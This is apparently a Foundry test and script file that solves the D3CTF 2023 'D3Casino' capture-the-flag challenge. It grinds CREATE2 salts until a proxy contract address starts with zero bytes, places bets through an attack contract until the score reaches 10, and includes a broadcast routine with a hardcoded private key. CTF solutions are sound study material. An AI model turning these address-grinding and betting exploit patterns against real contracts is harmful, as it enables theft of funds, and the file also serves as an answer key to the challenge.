// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "./D3CasinoAttack.sol";


contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = 0x027efa1d59b6a0710ce986dba26e0b91a8b5a5724866adf51702c168db0cb63d;
    address attacker = vm.addr(attacker_key);
    // address 0x003cB973628ea442fb58d24CBf6cEb434E6b15cf  prefix:0x00

    D3Casino casino;

    function setUp() public {
        vm.createSelectFork("mainnet");
        // vm.createSelectFork("http://localhost:8545");
        vm.startPrank(deployer, deployer);

        casino = new D3Casino();
        skip(10);

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        console2.log("score:",casino.scores(attacker));

        vm.stopPrank();

    }

    function solve() public noGasMetering {
        D3CasinoAttack casinoAttack = new D3CasinoAttack();
        
        for (uint i = 0; ; i++) {
            (address predictedAddress, bytes32 salt) = helpMemory(i, casinoAttack);
            if (uint160(predictedAddress)>>144 == 0) { // proxy contract address prefix:0x00
                casinoAttack.clone(salt);
                console2.log("Successfully deployed the proxy contract with zero prefix with salt %x", uint256(salt));
                address proxyAddress = casinoAttack.proxyAddress();
                D3CasinoAttack(proxyAddress).bet(address(casino));
                skip(10);
                if (casino.scores(attacker) >= 10) {
                    casino.Solve();
                    break;
                }
            }
        }
    }

    // https://github.com/foundry-rs/foundry/issues/3971
    function helpMemory(uint i, D3CasinoAttack casinoAttack) internal view returns(address, bytes32) {
        bytes32 salt = keccak256(abi.encode(i));
        return (casinoAttack.predict(salt), salt);
    }

    // forge script .\src\test\D3CTF_2023\D3Casino.t.sol:Attacker --slow --skip-simulation --broadcast
    function run() public {
        vm.startBroadcast(attacker_key);

        // casino = D3Casino(0xxxx);
        solve();
        console2.log("score:",casino.scores(attacker));

        vm.stopBroadcast();
    }
}


